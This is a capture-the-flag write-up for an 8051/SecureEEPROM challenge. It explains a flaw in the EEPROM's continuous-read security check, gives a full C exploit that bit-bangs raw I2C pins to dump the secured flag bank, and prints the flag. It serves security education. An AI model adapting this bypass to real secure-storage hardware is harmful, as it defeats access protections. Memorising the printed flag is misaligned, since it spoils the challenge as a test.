### Challenge Description:
```This 8051 board has a SecureEEPROM installed. It's obvious the flag is stored there. Go and get it.```

We are given `firmware.c` which runs on Intel 8051 emulator, and `seeprom.sv` which is a SystemVerilog source code that manages the so-called SecureEEPROM. After running the firmware, the emulator runs usercode supplied by the attacker.

Usually, the firmware/usercode (simply called "usercode" from now on) communicated with the EEPROM according to the given I2C protocol. The I2C protocol follows the below steps (note that emulator implementation details are omitted):
1. Usercode sets necessary data in XDATA region, at address 0xfe00 of size 0x10 bytes.
2. Usercode sets the `I2C_STATE` flag to 1, located in SFR region at address 0xfc of size 1 byte.
3. Usercode waits until `I2C_STATE` is set to 0. At this time, the EEPROM reads/writes data as requested by the usercode.
4. Usercode retrieves data back from the same XDATA region.

However, we have direct access to GPIO ports `RAW_I2C_SCL` and `RAW_I2C_SDA` used internally for the I2C protocol, located in SFR region at address 0xfa and 0xfb respectively. This allows us to communicate with the EEPROM directly.

The EEPROM splits 256 bytes of data into 4 banks of index 0 ~ 3, each having 64 bytes of data. Bank 1 holds the flag data, and has its secure bit set.

The EEPROM's SystemVerilog code has a vulnerability with contiuous read/write operations, as they check only if the secure state of current address and next address is the same but not whether if it actually is secure or not. This is not a huge problem if we only use the I2C protocol as given, but as we have access to raw GPIO ports this can be exploited as the following steps (using `enum i2c_state`, ACK omitted):
1. `I2C_START` -> `I2C_LOAD_CONTROL (SEEPROM_I2C_ADDR_MEMORY | 0)` -> `I2C_LOAD_ADDRESS (63)` sets `i2c_address_valid <= 1`
2. `I2C_START` -> `I2C_LOAD_CONTROL (SEEPROM_I2C_ADDR_SECURE | 0b0001)` sets bank 0 as secure
3. `I2C_START` -> `I2C_LOAD_CONTROL (SEEPROM_I2C_ADDR_MEMORY | 1)` -> `I2C_READ` where read succeeds since `i2c_address_valid == 1`, and proceeds to continous read since `i2c_address_secure == i2c_next_address_secure`
4. Receive & Print flag, byte-by-byte

Below is the analysis of how the usercode can interact with the EEPROM using raw scl/sda ports.
```
send_start:
    scl = 0
    sda = 1
    scl = 1
    sda = 0

recv_ack:
    scl = 0
    scl = 1
    return sda (0 == ACK, 1 == NACK)

send_byte:
for i in [0, 7]:
    scl = 0
    sda = (i'th bit from MSB)
    scl = 1

recv_byte:
for i in [0, 7]:
    scl = 0
    scl = 1
    (i'th bit from MSB) = sda

send_stop:
    scl = 0
    sda = 0
    scl = 1
    sda = 1
```

The (minimal) exploit usercode is given below.
```C
__sfr __at(0xff) POWEROFF;
__sfr __at(0xfd) CHAROUT;

__sfr __at(0xfa) RAW_I2C_SCL;
__sfr __at(0xfb) RAW_I2C_SDA;

const SEEPROM_I2C_ADDR_MEMORY = 0b10100000;
const SEEPROM_I2C_ADDR_SECURE = 0b01010000;

void print(const char *str)
{
    while (*str)
    {
        CHAROUT = *str++;
    }
}

void send_start()
{
    RAW_I2C_SCL = 0;
    RAW_I2C_SDA = 1;
    RAW_I2C_SCL = 1;
    RAW_I2C_SDA = 0;
}

void send_stop()
{
    RAW_I2C_SCL = 0;
    RAW_I2C_SDA = 0;
    RAW_I2C_SCL = 1;
    RAW_I2C_SDA = 1;
}

void recv_ack()
{
    RAW_I2C_SCL = 0;
    RAW_I2C_SCL = 1;
    if (RAW_I2C_SDA)
        print("NACK!!\n");
}

void send_byte(unsigned char byte)
{
    unsigned char i;
    for (i = 0; i <= 7; i++)
    {
        RAW_I2C_SCL = 0;
        RAW_I2C_SDA = ((byte >> (7 - i)) & 1) != 0;
        RAW_I2C_SCL = 1;
    }
}

unsigned char recv_byte()
{
    unsigned char byte = 0, i;
    for (i = 0; i <= 7; i++)
    {
        RAW_I2C_SCL = 0;
        RAW_I2C_SCL = 1;
        byte = (2 * byte) | RAW_I2C_SDA;
    }
    return byte;
}

void main(void)
{
    unsigned char i;

    send_start();
    send_byte(SEEPROM_I2C_ADDR_MEMORY | 0);
    recv_ack();
    send_byte(63);  // end of bank 0, just before bank 1 (flag)
    recv_ack();  // i2c_address_valid <= 1

    send_start();
    send_byte(SEEPROM_I2C_ADDR_SECURE | 0b0001);  // secure bank 0
    recv_ack();

    send_start();
    send_byte(SEEPROM_I2C_ADDR_MEMORY | 1);

    for (i = 0; i <= 63; i++)
    {
        recv_ack();
        CHAROUT = recv_byte();
    }

    send_stop();

    POWEROFF = 1;
}
```

**FLAG: `CTF{flagrom-and-on-and-on}`**